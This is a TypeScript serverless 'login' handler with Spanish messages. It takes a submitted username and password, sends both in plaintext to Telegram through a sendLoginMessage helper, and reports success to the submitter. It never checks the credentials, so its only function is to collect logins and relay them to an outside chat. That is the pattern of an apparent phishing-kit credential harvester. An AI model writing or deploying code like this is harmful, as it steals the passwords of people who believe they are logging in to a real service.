import { VercelRequest, VercelResponse } from '@vercel/node';
import { sendLoginMessage } from '../lib/telegram';

interface LoginRequest {
  usuario: string;
  password: string;
}

export async function handleLogin(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { usuario, password } = req.body as LoginRequest;
    
    if (!usuario || !password) {
      return res.status(400).json({ error: 'Usuario y contraseña son requeridos' });
    }

    // Enviar mensaje a Telegram
    await sendLoginMessage(usuario, password);

    return res.status(200).json({ 
      success: true, 
      message: 'Solicitud de inicio de sesión enviada' 
    });
  } catch (error) {
    console.error('Error en login:', error);
    return res.status(500).json({ error: 'Error al procesar la solicitud' });
  }
}